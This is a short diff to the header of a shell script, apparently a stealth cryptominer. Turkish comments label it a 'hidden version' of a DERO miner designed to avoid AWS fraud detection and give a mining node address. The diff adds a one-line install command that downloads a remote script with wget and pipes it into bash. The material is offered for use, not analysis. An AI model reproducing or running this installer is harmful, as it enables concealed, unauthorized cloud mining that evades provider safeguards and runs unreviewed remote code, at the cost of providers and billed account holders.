@@ -2,7 +2,10 @@
 # DERO Miner - Gizli Versiyon (AWS Fraud Detection Önleme)
 # Versiyon: 3.0 (Gizli)
 # Node: 91.98.80.16:10100
-# GitHub: Tek komutla çalıştırılabilir
+# GitHub: https://github.com/josephderler/miner.sh
+#
+# Tek Komutla Kurulum:
+# bash <(wget -qO- https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_gizleme.sh)
 
 set -e
 
